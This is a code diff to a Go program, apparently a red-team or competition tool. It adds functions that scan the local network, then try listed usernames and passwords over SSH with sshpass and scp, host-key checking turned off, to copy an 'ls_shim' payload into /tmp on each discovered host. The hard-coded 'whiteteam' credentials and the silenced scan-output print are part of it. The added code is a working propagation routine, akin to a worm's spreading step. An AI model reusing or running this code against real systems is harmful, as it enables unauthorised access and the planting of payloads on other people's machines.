@@ -13,6 +13,8 @@ import (
 var systemOS string = getOS()
 var isVerbose bool = false
 var isDemo bool = false
+var usernames []string
+var passwords []string
 
 func main() {
 	if isVerbose {
@@ -26,9 +28,24 @@ func main() {
 	if isVerbose {
 		fmt.Println("Dependencies installed")
 	}
+	buildDB()
 	ips := findIPs()
 	fmt.Println(ips)
+	transferFiles(ips)
 
+}
+
+func transferFiles(ips []string) {
+	for i := 0; i < len(ips); i++ {
+		for u := 0; u < len(usernames); u++ {
+			for p := 0; p < len(passwords); p++ {
+				cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ips[i]+":/tmp/")
+				cmd.Run()
+			}
+		}
+
+		return
+	}
 }
 
 func findIPs() []string {
@@ -43,7 +60,7 @@ func findIPs() []string {
 	cmd.Run()
 	ipFile, _ := os.ReadFile(".ipscan_lsshim")
 	ipStr := string(ipFile)
-	fmt.Println(ipStr)
+	//fmt.Println(ipStr)
 	ipArr := strings.Split(ipStr, "\n")
 	for i := 0; i < len(ipArr); i++ {
 		if strings.Index(ipArr[i], "Host: ") != -1 {
@@ -164,4 +181,9 @@ func GetOutboundIP() string {
 	ip := localAddr.IP
 	ipstr := ip.String()
 	return ipstr
+}
+
+func buildDB() {
+	usernames = append(usernames, "whiteteam")
+	passwords = append(passwords, "whiteteam")
 }
